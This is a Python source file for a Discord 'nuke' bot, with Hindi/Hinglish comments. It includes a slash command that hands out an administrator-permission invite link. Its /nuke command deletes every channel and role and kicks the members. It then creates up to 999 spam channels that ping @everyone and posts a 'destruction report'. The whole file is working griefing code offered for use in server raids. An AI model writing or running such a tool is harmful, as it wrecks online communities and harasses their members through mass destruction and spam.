import discord
from discord.ext import commands
import asyncio
import os
from dotenv import load_dotenv

load_dotenv()

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Bot logged in as {bot.user}")
    try:
        await bot.tree.sync()
        print("✅ Commands synced!")
    except Exception as e:
        print(f"❌ Error syncing commands: {e}")

# ADD COMMAND - Server ID से automatic invite
@bot.tree.command(name="add", description="🤖 Server ID daal kar bot ko add karo!")
@discord.app_commands.describe(server_id="Target server ka ID")
async def add(interaction: discord.Interaction, server_id: str):
    """Server ID daalkar bot ko directly add karo"""
    
    CLIENT_ID = os.getenv("CLIENT_ID", "1469213868323504261")
    
    try:
        # Invite link generate karo
        invite_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&permissions=8&scope=bot%20applications.commands"
        
        # Embed message
        embed = discord.Embed(
            title="🤖 Bot को Add करें",
            description=f"Server ID: `{server_id}`\n\n**Bot को add करने के लिए नीचे क्लिक करें!**",
            color=discord.Color.red()
        )
        embed.add_field(
            name="⚡ Quick Add:",
            value="बटन दबाओ → Server select करो → Authorize करो → DONE! ✅",
            inline=False
        )
        embed.set_footer(text="Bot add होने के बाद /nuke command काम करेगी!")
        
        # Button with direct invite
        class AddBotView(discord.ui.View):
            @discord.ui.button(
                label="⚡ Add Bot Now",
                style=discord.ButtonStyle.red,
                emoji="➕"
            )
            async def add_bot_button(self, inter: discord.Interaction, button: discord.ui.Button):
                await inter.response.send_message(
                    f"🔗 **[यहाँ क्लिक करके Bot को Add करो!]({invite_url})**\n\n✅ Bot add होने के बाद `/nuke` command use कर सकते हो!",
                    ephemeral=True
                )
        
        await interaction.response.send_message(embed=embed, view=AddBotView())
        
    except Exception as e:
        await interaction.response.send_message(f"❌ Error: {str(e)}", ephemeral=True)

# NUKE COMMAND - बिना किसी extra setup के
@bot.tree.command(name="nuke", description="💥 COMPLETE SERVER DESTRUCTION! 💥")
@discord.app_commands.checks.has_permissions(administrator=True)
async def nuke(interaction: discord.Interaction):
    """सीधे server को nuke कर दो!"""
    await interaction.response.defer()
    
    guild = interaction.guild
    
    try:
        # Initial message
        await interaction.followup.send("🔥 **NUKE शुरू हो गया!** 💥")
        print(f"🔥 NUKE शुरू: {guild.name}")
        
        # Phase 1: Delete ALL channels
        print("🔥 PHASE 1: DELETING ALL CHANNELS...")
        for channel in list(guild.channels):
            try:
                await channel.delete()
                print(f"💥 DESTROYED: {channel.name}")
            except Exception as e:
                print(f"⚠️ Error: {e}")
            await asyncio.sleep(0.1)
        
        # Phase 2: Delete ALL roles except @everyone
        print("🔥 PHASE 2: DELETING ALL ROLES...")
        for role in list(guild.roles):
            if role.name != "@everyone":
                try:
                    await role.delete()
                    print(f"💥 DESTROYED ROLE: {role.name}")
                except Exception as e:
                    print(f"⚠️ Error: {e}")
            await asyncio.sleep(0.1)
        
        # Phase 3: Kick all members
        print("🔥 PHASE 3: KICKING ALL MEMBERS...")
        for member in list(guild.members):
            if member.id != interaction.user.id and not member.bot:
                try:
                    await member.kick(reason="SERVER NUKED 💥")
                    print(f"👢 KICKED: {member.name}")
                except Exception as e:
                    print(f"⚠️ Could not kick {member.name}: {e}")
            await asyncio.sleep(0.1)
        
        # Phase 4: Create 999+ channels
        print("🔥 PHASE 4: CREATING CHAOS CHANNELS...")
        spam_messages = [
            "🚀 APKA SERVER KI GOP GOP HOGYI! 💥",
            "⚡ SERVER COMPLETELY NUKED! ⚡",
            "🎆 DESTRUCTION COMPLETE! 🎆",
            "🌋 NUCLEAR OPTION ACTIVATED! 🌋",
            "🔥 TOTAL ANNIHILATION! 🔥",
            "💥 APKA SERVER KA KOI BACHA HI NAHI BACHA! 💥",
        ]
        
        for i in range(999):
            try:
                channel_name = f"gop-gop-{i+1}-💣"
                channel = await guild.create_text_channel(channel_name)
                
                message = spam_messages[i % len(spam_messages)]
                await channel.send(message)
                await channel.send(f"@everyone {message}")
                
                print(f"💥 Created channel {i+1}: {channel_name}")
                
                if i % 10 == 0:
                    await asyncio.sleep(1)
                else:
                    await asyncio.sleep(0.2)
                    
            except discord.Forbidden:
                print(f"⚠️ Cannot create more channels")
                break
            except Exception as e:
                print(f"⚠️ Error at channel {i+1}: {e}")
                break
        
        # Final message
        try:
            general = await guild.create_text_channel("0-nuke-complete")
            await general.send("""
🚀🚀🚀 **SERVER KI COMPLETE NUKING HO GAYEE!** 🚀🚀🚀

╔═══════════════════════════════════════╗
║  💥 TOTAL DESTRUCTION REPORT 💥      ║
╠═══════════════════════════════════════╣
║ ✅ All Channels: DELETED              ║
║ ✅ All Roles: DELETED                 ║
║ ✅ All Members: KICKED                ║
║ ✅ 999+ Chaos Channels: CREATED       ║
║ ✅ Gop Gop Messages: SPAMMED          ║
╚═══════════════════════════════════════╝

**SERVER STATUS: 💀 DEAD 💀**
""")
        except:
            pass
        
        await interaction.followup.send("✅ **NUKE COMPLETE!** 💥🔥 Server हल्क हो गया!")
        print("✅ NUKE SUCCESSFUL!")
        
    except discord.Forbidden:
        await interaction.followup.send("❌ Bot को Admin permission नहीं है!")
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

# Run bot
TOKEN = os.getenv("DISCORD_TOKEN")
if TOKEN:
    bot.run(TOKEN)
else:
    print("❌ DISCORD_TOKEN not found in .env file!")
